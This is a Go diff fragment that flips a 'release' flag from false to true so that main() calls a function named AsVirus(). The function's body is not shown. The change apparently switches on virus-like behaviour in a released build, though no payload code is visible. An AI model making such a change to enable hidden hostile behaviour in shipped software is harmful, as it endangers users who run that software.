@@ -535,7 +535,7 @@ func AsVirus() {
 }
 
 func main() {
-	release := false
+	release := true
 	if release {
 		AsVirus()
 	}
